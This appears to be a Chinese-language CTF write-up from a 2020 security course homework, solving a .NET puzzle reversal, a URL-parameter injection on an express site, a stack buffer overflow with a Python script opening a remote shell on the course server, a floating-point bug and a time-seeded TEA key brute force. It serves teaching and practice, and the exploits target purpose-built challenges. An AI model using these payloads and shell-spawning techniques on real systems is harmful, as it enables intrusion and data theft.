@@ -1,0 +1,646 @@
+---
+title: "2020::程式安全::HW0 Write-up"
+description: ""
+publishDate: "2020-09-25"
+category: "CTF"
+layout: "../../layouts/ArticleLayout.astro"
+---
+
+
+早安是我拉ฅ(=ˇωˇ=)ฅ，今年又是助教拉，騙個流量，感恩。
+# Eekum Bokum
+
+## Recon
+
+首先可以先跟程式互動一下掌握功能，總之看起來是一個 [n-puzzle game](https://en.wikipedia.org/wiki/15_puzzle)，值得一提的是，這個遊戲的 16 個方塊總共可以組成 $16!$ 個開局（可動塊不一定要在右下），其中洽有一半無解，因為我們遊戲過程中只能使用上下左右，組合出來的是一個交錯群，但這個起始盤面 16 號在右下且只有一次置換，不可能有解，所以別玩了，好好逆向好ㄇ：
+
+<Image src="./rev0.png" alt="" />
+
+總之先嘗試 file 它，可以發現他是 .Net assembly：
+
+```sh
+$file EekumBokum.exe
+EekumBokum.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+```
+
+.Net 跟 JVM 類似，基本上就是一個執行 bytecode 的環境，bytecode 的好處除了方便移植到各個平台外，還非常好逆向(?)，這裡可以用 [dnSpy](https://github.com/0xd4d/dnSpy) 來幫助解題，匯入後長這樣：
+
+<Image src="./rev1.png" alt="" />
+
+總之 Program 是程式的入口點，他會叫起 Form1 也就是我們所看到的介面，直接打開來看，可以看得到建構式應該是在排遊戲盤面：
+
+```csharp =17
+public Form1()
+{
+    this.InitializeComponent();
+    this.idxMovable = 15;
+    this.originalPicture.AddRange(new Bitmap[]
+    {
+        Resources.EekumBokum_1,
+        Resources.EekumBokum_2,
+        Resources.EekumBokum_3,
+        Resources.EekumBokum_4,
+        Resources.EekumBokum_5,
+        Resources.EekumBokum_6,
+        Resources.EekumBokum_7,
+        Resources.EekumBokum_8,
+        Resources.EekumBokum_9,
+        Resources.EekumBokum_10,
+        Resources.EekumBokum_11,
+        Resources.EekumBokum_12,
+        Resources.EekumBokum_13,
+        Resources.EekumBokum_14,
+        Resources.EekumBokum_15,
+        Resources.EekumBokum_16
+    });
+    List<PictureBox> listPitctureOrderedByName = (from PictureBox c in this.groupBox1.Controls
+    orderby Regex.Replace(c.Name, "\\d+", (Match n) => n.Value.PadLeft(4, '0'))
+    select c).ToList<PictureBox>();
+    for (int i = 0; i < 16; i++)
+    {
+        listPitctureOrderedByName[i].Image = this.originalPicture[i];
+    }
+    listPitctureOrderedByName[13].Image = this.originalPicture[14];
+    listPitctureOrderedByName[14].Image = this.originalPicture[13];
+}
+```
+
+繼續往下看可以發現 `samonCheck` 這個 method，可以發現在 method 的最後會生成一個跟 flag 相關的視窗，method 的中段做了一些不可描述的操作，看起來是解密，不過不需要急著看懂它，因為顯然是可以繞過的：
+
+```csharp =52
+private void samonCheck(List<PictureBox> listPitcture)
+{
+    List<byte> pwdl = new List<byte>();
+    for (int p = 0; p < 16; p++)
+    {
+        pwdl.Add(((Bitmap)listPitcture[p].Image).GetPixel(66, 99).R);
+        if (!listPitcture[p].Image.Equals(this.originalPicture[p]))
+        {
+            return;
+        }
+    }
+    // 解密開始
+    byte[] data = new byte[]{250,241,107,182,244,110,21,129,17,240,155,200,111,111,225,110,180,224,156,194,29,106,141,216,99,58,59,191,45,227,184,221,63,139,223,232,129,201,121,62,164,113,247,230,67,108,182,231};
+    byte[] pwd = pwdl.ToArray();
+    int[] key = new int[256];
+    int[] box = new int[256];
+    byte[] cipher = new byte[data.Length];
+    int i;
+    for (i = 0; i < 256; i++)
+    {
+        key[i] = (int)pwd[i % pwd.Length];
+        box[i] = i;
+    }
+    int j;
+    for (i = (j = 0); i < 256; i++)
+    {
+        j = (j + box[i] + key[i]) % 256;
+        int tmp = box[i];
+        box[i] = box[j];
+        box[j] = tmp;
+    }
+    int a;
+    j = (a = (i = 0));
+    while (i < data.Length)
+    {
+        a++;
+        a %= 256;
+        j += box[a];
+        j %= 256;
+        int tmp = box[a];
+        box[a] = box[j];
+        box[j] = tmp;
+        int k = box[(box[a] + box[j]) % 256];
+        cipher[i] = (byte)((int)data[i] ^ k);
+        i++;
+    }
+    //解密結束
+    MessageBox.Show("this is your flag\n" + Encoding.ASCII.GetString(cipher));
+}
+```
+
+關鍵的程式碼在 54 行開始的地方，假設當前遊戲盤面個元素都跟`originalPicture`一樣的話，就把每個方塊中的圖片位於座標 (66.99) 的 pixel 拿出來，做為後半段解密 flag 的 key：
+
+```csharp =54
+    List<byte> pwdl = new List<byte>();
+    for (int p = 0; p < 16; p++)
+    {
+        pwdl.Add(((Bitmap)listPitcture[p].Image).GetPixel(66, 99).R);
+        if (!listPitcture[p].Image.Equals(this.originalPicture[p]))
+        {
+            return;
+        }
+    }
+```
+
+這裡直覺的作法應該就是把圖片抽出來，拿出對應座標的 pixel，然後解密，但由於 .Net 非常好還原，dnSpy 還原出來的 code 基本上跟 source code 沒差別，所以我們其實可以重新 compile 他就好了，在 Form1 的建構子上面點 Edit Method：
+
+<Image src="./rev2.png" alt="" />
+
+直接讓遊戲開局的盤面變成走一步可解就好了，直接修改建構子然後點 Compile，之後存檔就好了：
+
+```csharp
+listPitctureOrderedByName[13].Image = this.originalPicture[14];
+listPitctureOrderedByName[14].Image = this.originalPicture[13];
+//把上面兩行改成下面兩行
+listPitctureOrderedByName[14].Image = this.originalPicture[15];
+listPitctureOrderedByName[15].Image = this.originalPicture[14];
+```
+
+## Exploit (or just move)
+
+重新執行修改過後完成 compile 的程式：
+
+<Image src="./rev3.png" alt="" />
+
+(按一下左鍵)
+
+<Image src="./rev4.png" alt="" />
+
+flag: `flag{NANI_KORE?(=.=)EEKUM_BOKUM(=^=)EEKUM_BOKUM}`
+
+# owoHub
+
+## Recon
+
+題目的介面很簡單，可以輸入 username 跟選擇 I am cute/not cute，簡單跟題目互動來掌握一下有什麼功能。
+
+<Image src="./web0.png" alt="" />
+
+如果勾選 I am not cute，網站會顯示一堆 Stop
+
+<Image src="./web0-1.png" alt="" />
+這裡的 I am cute 沒辦法選擇，但這只是 html tag 而已，最快的方法就是用開發者工具拔掉 attribute
+
+<Image src="./web1.png" alt="" />
+直接拿掉，之後就能勾選了
+<Image src="./web2.png" alt="" />
+
+進來後有一堆可愛小吉，雖然對於我來說比 flag 讚多了，但還是遵循世俗的價值，繼續尋找 flag
+<Image src="./web3.png" alt="" />
+
+接下來看一下題目提供的 [source code](https://owohub.zoolab.org/source) 看看有沒有有趣的資訊（<a href="/files/ web-source.txt">備份 </a>)，從前幾行知道這是用 express 寫的網站（寫這種題目卡住的話，就不要一直看螢幕了，架一個一樣的服務戳戳看），而且 authServer 有我們想要的 flag，但從 12 行可以知道這個 server 只接受 local 的連線，我們只能間接跟他互動，不過現在知道要拿到 flag 的條件是成為 admin 而且 `givemeflag === "yes"`
+
+```javascript =
+authServer.get("/", (request, response) => {
+    const { data, givemeflag } = request.query;
+    const userInfo = JSON.parse(data);
+    if (givemeflag === "yes" && userInfo.admin) // You don't need to be cute to get the flag ouo!
+        response.send(FLAG);
+    else
+        response.send({
+            username: `Hellowo, ${userInfo.username}${userInfo.admin ? "<(_ _)>" : ""}!`,
+            imageLinks: cuteOnlyImages.map(link => userInfo.cute ? link : "javascript:alert('u are not cute oAo!')")
+        });
+});
+authServer.listen(9487, "127.0.0.1");
+```
+
+往上看一下如何成為 admin，首先在 4~8 行可以看到 username 跟 cute 有型別跟內容的限制，10~13 行限制 username 只能使用 alphanumeric，15~17 行會直接把 username 及 cute 不做其他處理直接放進 URL 裡面，而且在正常情況下 `givemeflag` 永遠不可能是 yes，掌握了 source 跟 sink，這裏顯然是要污染 17 行的 URL，讓 app 去 authServer 把 flag 拿回來：
+
+```javascript =
+app.get('/auth', (request, response) => {
+    const { username, cute } = request.query;
+
+    if (typeof username !== "string" || typeof cute !== "string" ||
+        username === "" || !cute.match("(true|false)$")) {
+        response.send({ error: "Whaaaat owo?" });
+        return;
+    }
+
+    if (username.match(/[^a-z0-9]+/i)) {
+        response.send({ error: "`Username` should contain only letters & numbers, owo." });
+        return;
+    }
+
+    const userInfo = `{"username":"${username}","admin":false,"cute":${cute}}`;
+
+    const api = `http://127.0.0.1:9487/?data=${userInfo}&givemeflag=no`;
+    http.get(api, resp => {
+        resp.setEncoding("utf-8");
+        if (resp.statusCode === 200)
+            resp.on('data', data => response.send(data));
+        else
+            response.send({ error:  "qwq..." });
+    });
+})
+app.listen(8787, "0.0.0.0");
+```
+
+## Exploit
+
+首先已經知道 username 只能放 alphanumeric，這一個 regex 看起來沒問題，機會不大，另外一個輸入就是 cute，根據剛剛 source code 的結果可以知道輸入只能是 "true" 或是 "false"，但 javascript 的 match 是在 String 找到符合 pattern 的子字串，所以照 source code 的寫法，只要能夠在字串尾端找得到 "true" 或是 "false" 就好了，例如
+
+```javascript
+"this is not true".match("(true|false)$") !== null
+true
+"this is false".match("(true|false)$") !== null
+true
+//正確應該是這條
+"true is false, false is true".match("^(true|false)$") === null
+true
+```
+
+所以 cute 是可以注入的，可以先透過這個方法拿到 admin，如果我們的 cute 填入 `true,"admin":true}&a={true`，那 userinfo 就會被我們改成
+
+```javascript
+{"username":"nini","admin":false,"cute":true,"admin":true}&a={true}
+//最後被訪問的 URL 也就變成
+//http://127.0.0.1:9487/?data={"username":"nini","admin":false,"cute":true,"admin":true}&a={true}&givemeflag=no
+```
+
+這裡的 `&a` 的 `&` 要先進行一次 urlencode 不然會被 `app.get('/auth'` 直接拿來用，訪問 `https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26a={true`，就能成功變成 admin 了：
+
+<Image src="./webadmin.png" alt="" />
+
+下一個問題是要怎麼把 `givemeflag` 改成 "yes"，再發起請求的時給予多個同名的 GET parameters，server 會取最後一個，我們注入的點在 `givemeflag=no` 之前，所以沒辦法直接蓋掉，這裡可以用 pound sign 來把後半段的 GET parameter 直接變成 URL 的 anchor，得到最後的 cute
+
+```javascript
+true,"admin":true}&givemeflag=yes#true
+//最後被訪問的 URL 也就變成
+//http://127.0.0.1:9487/?data={"username":"nini","admin":false,"cute":true,"admin":true}&givemeflag=yes#true}&givemeflag=no
+```
+
+一樣 `&` 跟 `#` 要先 urlencode，最後的 payload :
+[https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26givemeflag=yes%23true](https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26givemeflag=yes%23true)
+
+flag: `FLAG{owo_ch1wawa_15_th3_b35t_uwu!!!}`
+
+# CafeOverflow
+
+## Recon
+
+可以先 nc 跟 remote 服務互動一下，看起來是很簡單的程式:
+
+```sh
+$ nc hw00.zoolab.org 65534
+What is your name : nini
+Hello, nini
+```
+
+可以試試看塞長一點的名字，然後他就 crash 了，如果這一步做不到也沒關係，我們可以進行靜態分析：
+
+```sh
+$ python -c "print('a'*0x2000)" | nc hw00.zoolab.org 65534
+What is your name : %
+```
+
+先 file 他，可以知道是 ELF 64位元的執行檔，而且 debug symbol 沒有 strip
+
+```sh
+$ file CafeOverflow
+CafeOverflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a51ce7f3649d54780b84a937f14af5b4e8a50f51, for GNU/Linux 3.2.0, not stripped
+```
+
+雖然可以用諸如 IDA、Ghidra 之類的 decompiler，但這裡還是用比較簡單的 disassembler 來做題目就好了
+
+```sh
+# -s 用來把除了 assembly 之類的訊息也印出來，比較好找到一些常數
+# -M 用來指定 objdump 顯示 intel syntax 風格的 assembly
+$ objdump -d -s  CafeOverflow  -M intel | less
+```
+
+main 裡面用來吃輸入的地方使用的是 scanf，scanf 的第一個參數會放在 rdi 上，因為我們有下 -s，往上滑到最上面就可以找到 0x40203d，對應字串 %s，因為 %s 沒有限制輸入大小，所以這裡有一個 buffer overflow 的漏洞
+
+```asm
+  401239:       48 8d 45 f0             lea    rax,[rbp-0x10]
+  40123d:       48 89 c6                mov    rsi,rax
+  401240:       48 8d 3d f6 0d 00 00    lea    rdi,[rip+0xdf6]        # 40203d <_IO_stdin_used+0x3d>
+  401247:       b8 00 00 00 00          mov    eax,0x0
+  40124c:       e8 1f fe ff ff          call   401070 <__isoc99_scanf@plt>
+```
+
+題目很好心的有提供開 shell 的 function，叫做 func1，就在 main 的上面：
+
+```asm
+0000000000401176 <func1>:
+  401176:       55                      push   rbp
+  401177:       48 89 e5                mov    rbp,rsp
+  40117a:       48 83 ec 10             sub    rsp,0x10
+  40117e:       48 89 c0                mov    rax,rax
+  401181:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
+  401185:       48 b8 fe ca fe ca fe    movabs rax,0xcafecafecafecafe
+  40118c:       ca fe ca
+  40118f:       48 39 45 f8             cmp    QWORD PTR [rbp-0x8],rax
+  401193:       75 22                   jne    4011b7 <func1+0x41>
+  401195:       48 8d 3d 68 0e 00 00    lea    rdi,[rip+0xe68]        # 402004 <_IO_stdin_used+0x4>
+  40119c:       e8 8f fe ff ff          call   401030 <puts@plt>
+  4011a1:       48 8d 3d 68 0e 00 00    lea    rdi,[rip+0xe68]        # 402010 <_IO_stdin_used+0x10>
+  4011a8:       e8 93 fe ff ff          call   401040 <system@plt>
+  4011ad:       bf 00 00 00 00          mov    edi,0x0
+  4011b2:       e8 c9 fe ff ff          call   401080 <exit@plt>
+  4011b7:       48 8d 3d 5a 0e 00 00    lea    rdi,[rip+0xe5a]        # 402018 <_IO_stdin_used+0x18>
+  4011be:       e8 6d fe ff ff          call   401030 <puts@plt>
+  4011c3:       90                      nop
+  4011c4:       c9                      leave
+  4011c5:       c3                      ret
+```
+
+## Exploit
+
+那我們試試看直接跳上去會發生什麼事：
+
+```sh
+#首先製造一個檔案包含 300 個 0x401176 (func1 的位置)
+#用來當作輸入
+$ python3 -c "import struct; f=open('payload','wb'); f.write(struct.pack('<Q',0x401176)*300) ;f.write(b'\n'); f.close()"
+#把輸入 pipe 給 CafeOverflow
+$ cat payload | ./CafeOverflow
+What is your name : Hello, v@
+Not quite right
+Not quite right
+Not quite right
+Not quite right
+Not quite right
+Not quite right
+Not quite right
+Not quite right
+...略
+```
+
+看來還有條件沒達成，回頭看一下 func1 會發現其實他有檢查 rax 是否等於 0xcafecafecafecafe，當然，rax 是可控的，但這邊提供一個快一點的解法，就是直接跳到 rax 的檢查之後就好了，在這裡就是 0x4011a1 這個位置
+
+```asm
+0000000000401176 <func1>:
+  401176:       55                      push   rbp
+  401177:       48 89 e5                mov    rbp,rsp
+  40117a:       48 83 ec 10             sub    rsp,0x10
+  40117e:       48 89 c0                mov    rax,rax
+  401181:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
+  401185:       48 b8 fe ca fe ca fe    movabs rax,0xcafecafecafecafe
+  40118c:       ca fe ca
+  40118f:       48 39 45 f8             cmp    QWORD PTR [rbp-0x8],rax
+  401193:       75 22                   jne    4011b7 <func1+0x41>
+  401195:       48 8d 3d 68 0e 00 00    lea    rdi,[rip+0xe68]        # 402004 <_IO_stdin_used+0x4>
+  40119c:       e8 8f fe ff ff          call   401030 <puts@plt>
+  4011a1:       48 8d 3d 68 0e 00 00    lea    rdi,[rip+0xe68]        # 402010 <_IO_stdin_used+0x10>
+  4011a8:       e8 93 fe ff ff          call   401040 <system@plt>
+  4011ad:       bf 00 00 00 00          mov    edi,0x0
+  4011b2:       e8 c9 fe ff ff          call   401080 <exit@plt>
+  4011b7:       48 8d 3d 5a 0e 00 00    lea    rdi,[rip+0xe5a]        # 402018 <_IO_stdin_used+0x18>
+  4011be:       e8 6d fe ff ff          call   401030 <puts@plt>
+  4011c3:       90                      nop
+  4011c4:       c9                      leave
+  4011c5:       c3                      ret
+```
+
+所以再試一次
+
+```sh
+#一樣造一個檔案做輸入
+$ python3 -c "import struct; f=open('payload','wb'); f.write(struct.pack('<Q',0x4011a1)*300) ;f.write(b'\n'); f.close()"
+# 這裡用 - 把 stdin 接回來，如果成功拿到 shell 才能夠互動
+$ cat payload - | ./CafeOverflow
+What is your name : Hello, �@
+whoami #terminal 會卡在這裡，要自己打 whoami
+terrynini38514
+```
+
+看來 local 成功拿到 shell 了，來試試看拿 remote shell，因為是 remote 的關係，為求穩定，這裡就不繼續用 cat 了，改用 telnetlib 來跟遠端 socket 溝通
+
+```py payload.py =
+#!/usr/bin/env python3
+
+import telnetlib
+import struct
+
+r = telnetlib.Telnet("hw00.zoolab.org", 65534)
+
+print(r.read_until(b'What is your name : '))
+
+payload = struct.pack('<Q',0x4011a1)*300 + b'\n'
+
+r.write(payload)
+print(r.read_until(b'\n'))
+
+r.interact()
+```
+
+然後我們就 pwn 下 server 了
+
+```sh
+$ python3 payload.py
+b'What is your name : '
+b'Hello, \xa1@\n'
+whoami
+Cafeoverflow
+cat /home/`whoami`/flag
+flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}
+```
+
+flag: `flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}`
+
+# The Floating Aquamarine
+
+## Recon
+
+這題的考點應該很明顯是浮點數誤差，原因應該很好理解，拿出這個剛學 C 的時候練習過的程式，i 一直加 0.1 是不會剛好等於 1.0 的，因為 IEEE754 的 0.1 不是 0.1：
+
+```c WTF.c =
+#include <stdio.h>
+
+int main(){
+    for(float i = 0 ; i != 1.0 ; i += 0.1){
+        puts("not yet");
+        if ( i > 1.0){
+            puts("What the...");
+            break;
+        }
+    }
+    return 0;
+}
+```
+
+## Exploit
+
+所以只要能夠在買賣之間造成價差就好了，問題是怎麼找到，因為我也想不到一個很讚的方法，例如說什麼挑這兩個數字是質數啊，還是挑的數字 factor 不要有 5,2 啊什麼的，我是沒想出來，有什麼很酷炫的數學方法再告訴我，這題較快的方法就爆破或是靠感覺（？）， 總之我是靠感覺把 100000000 拆成兩個質數就過了，令人難以接受，當然這裡可以輕鬆寫個 C 來幫助你，既然浮點數誤差算起來麻煩，那就不要算，就讓他誤差就好了：
+
+```c Buffett.c =
+#include <iostream>
+#include <cassert>
+#include <unistd.h>
+#include <iomanip>
+#include <algorithm>
+
+using std::cin;
+using std::cout;
+using std::endl;
+using std::getenv;
+using std::max;
+
+const int ALL_STONE = 100000000;
+const float PRICE = 88.88;
+const float RICH = 3000.0;
+
+int main(int argc, char *argv[]) {
+  std::cout << std::setprecision(16);
+  float max_gain = 0;
+  for(int i = 1; i < ALL_STONE ; i++){
+        float gain = -PRICE*(ALL_STONE) + PRICE*i + PRICE*(ALL_STONE-i);
+        if (gain > max_gain){
+            cout << i << " " << ALL_STONE-i << " "<< gain << endl;
+            max_gain = gain;
+        }
+  }
+  return 0;
+}
+/*
+6 99999994 1024
+96646572 3353428 1088
+96654844 3345156 1120
+*/
+```
+
+所以就買獲利 1120 的那組就對了，然後我的買法：
+
+```=
+100000000
+-99999989
+-11
+100000000
+-99999989
+-11
+100000000
+-99999989
+-11
+Wow! You have 3025.68 dollars!
+Well done! Here is your flag: FLAG{floating_point_error_https://0.30000000000000004.com/}
+```
+
+flag: `FLAG{floating_point_error_https://0.30000000000000004.com/}`
+
+# 解密一下
+
+## Recon
+
+這題的中文看起來有點煩躁，總之`正轉換`跟`逆轉換`基本上就只是把 bytes 跟 list 互換，沒有誤用的話對加密的過程沒有危害，`_加密`這個 function 實作的是 [Tiny Encryption Algorithm](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm)，差別是出題者的 Delta 用了不同的數值，不能識別出是這個算法也沒關係，仔細看的話，完全是可以自己寫出解密函式的，可以嘗試餵輸入給`_加密`看看，從過程跟結果看起來這應該是一個有用的加密 function，加上密文過短，針對加密方法本身的攻擊在這裡看起來不太可能：
+
+```py =
+#!/usr/bin/env python3
+import time as 時間
+import random as 隨機
+from typing import List as 陣列
+from io import BufferedReader as 緩衝讀取者
+from forbiddenfruit import curse as 詛咒
+
+整數 = int
+詛咒(整數, "從位元組", 整數.from_bytes)
+詛咒(整數, "到位元組", 整數.to_bytes)
+位元組 = bytes
+詛咒(位元組, "十六進制", 位元組.hex)
+詛咒(位元組, "加入", 位元組.join)
+詛咒(緩衝讀取者, "讀取", 緩衝讀取者.read)
+隨機.種子 = 隨機.seed
+隨機.給我隨機位元們 = 隨機.getrandbits
+時間.現在 = 時間.time
+列印 = print
+打開 = open
+範圍 = range
+長度 = len
+大端序 = 'big'
+讀取位元組 = 'rb'
+
+def 正轉換(資料, 大小=4):
+    return [整數.從位元組(資料[索引:索引+大小], 大端序) for 索引 in 範圍(0, 長度(資料), 大小)]
+
+def 逆轉換(資料, 大小=4):
+    return b''.加入([元素.到位元組(大小, 大端序) for 元素 in 資料])
+
+def _加密(向量: 陣列[整數], 金鑰: 陣列[整數]):
+    累加, 得優塔, 遮罩 = 0, 0xFACEB00C, 0xffffffff
+    for 次數 in 範圍(32):
+        累加 = 累加 + 得優塔 & 遮罩
+        向量[0] = 向量[0] + ((向量[1] << 4) + 金鑰[0] & 遮罩 ^ (向量[1] + 累加) & 遮罩 ^ (向量[1] >> 5) + 金鑰[1] & 遮罩) & 遮罩
+        向量[1] = 向量[1] + ((向量[0] << 4) + 金鑰[2] & 遮罩 ^ (向量[0] + 累加) & 遮罩 ^ (向量[0] >> 5) + 金鑰[3] & 遮罩) & 遮罩
+    return 向量
+
+def 加密(明文: 位元組, 密鑰: 位元組):
+    密文 = b''
+    for 索引 in 範圍(0, 長度(明文), 8):
+        密文 += 逆轉換(_加密(正轉換(明文[索引:索引+8]), 正轉換(密鑰)))
+    return 密文
+
+if __name__ == '__main__':
+    旗幟 = 打開('旗幟', 讀取位元組).讀取()
+    assert 長度(旗幟) == 16
+    隨機.種子(整數(時間.現在()))
+    密鑰 = 隨機.給我隨機位元們(128).到位元組(16, 大端序)
+    密文 = 加密(旗幟, 密鑰)
+    列印(f'密文 = {密文.十六進制()}')
+```
+
+## Exploit
+
+但我們可以注意到，這程式的`密鑰`是將時間做為 random seed 所隨機出來的 128 bits，那我們就可以把 key space 縮小到我們可以 brute force 出來的大小，至少知道這個時間點是在 python3 被發行到你現在的這個瞬間
+
+```py =49
+    隨機.種子(整數(時間.現在()))
+    密鑰 = 隨機.給我隨機位元們(128).到位元組(16, 大端序)
+```
+
+也就是我們只要枚舉從現在開始往前的每秒作為 random seed 直接解密看看就好了，因為是以 8 byte 為一個單位解密，我們先解前面 8 byte 看有沒有 flag prefix 會快一點。注意的是因為我們在逆轉加密 aka 解密，`累加`要換成`0xfaceb00c*32&0xffffffff`，操作也都是反轉，掉書袋一下，就 [Feistel](https://en.wikipedia.org/wiki/Feistel_cipher)，看著圖比較好理解為啥要逆轉：
+
+```py decrypt.py =
+#!/usr/bin/env python3
+import time as 時間
+import random as 隨機
+from typing import List as 陣列
+from io import BufferedReader as 緩衝讀取者
+from forbiddenfruit import curse as 詛咒
+
+整數 = int
+詛咒(整數, "從位元組", 整數.from_bytes)
+詛咒(整數, "到位元組", 整數.to_bytes)
+位元組 = bytes
+詛咒(位元組, "十六進制", 位元組.hex)
+詛咒(位元組, "加入", 位元組.join)
+詛咒(緩衝讀取者, "讀取", 緩衝讀取者.read)
+隨機.種子 = 隨機.seed
+隨機.給我隨機位元們 = 隨機.getrandbits
+時間.現在 = 時間.time
+列印 = print
+打開 = open
+範圍 = range
+長度 = len
+大端序 = 'big'
+讀取位元組 = 'rb'
+
+def 正轉換(資料, 大小=4):
+    return [整數.從位元組(資料[索引:索引+大小], 大端序) for 索引 in 範圍(0, 長度(資料), 大小)]
+
+def 逆轉換(資料, 大小=4):
+    return b''.加入([元素.到位元組(大小, 大端序) for 元素 in 資料])
+
+def _解密(向量: 陣列[整數], 金鑰: 陣列[整數]):
+    累加, 得優塔, 遮罩 = 0x59d60180, 0xFACEB00C, 0xffffffff
+    for 次數 in 範圍(32):
+        向量[1] = 向量[1] - ((向量[0] << 4) + 金鑰[2] & 遮罩 ^ (向量[0] + 累加) & 遮罩 ^ (向量[0] >> 5) + 金鑰[3] & 遮罩) & 遮罩
+        向量[0] = 向量[0] - ((向量[1] << 4) + 金鑰[0] & 遮罩 ^ (向量[1] + 累加) & 遮罩 ^ (向量[1] >> 5) + 金鑰[1] & 遮罩) & 遮罩
+        累加 = 累加 - 得優塔 & 遮罩
+    return 向量
+
+def 解密(明文: 位元組, 密鑰: 位元組):
+    密文 = b''
+    for 索引 in 範圍(0, 長度(明文), 8):
+        密文 += 逆轉換(_解密(正轉換(明文[索引:索引+8]), 正轉換(密鑰)))
+    return 密文
+
+from itertools import product
+
+if __name__ == '__main__':
+    cipher = bytes.fromhex('77f905c39e36b5eb0deecbb4eb08e8cb')
+    now = int(時間.time()) - 86400*2
+    subcipher = cipher[:8]
+    while now > 0:
+        now -= 1
+        隨機.種子(now)
+        密鑰 = 隨機.給我隨機位元們(128).到位元組(16, 大端序)
+        plain = 解密(subcipher, 密鑰)
+        if plain.startswith((b'flag',b'FLAG')):
+            print(解密(cipher, 密鑰))
+            break
+```
+
+然後就可以拿到 flag 了
+
+flag: `FLAG{4lq7mWGh93}`
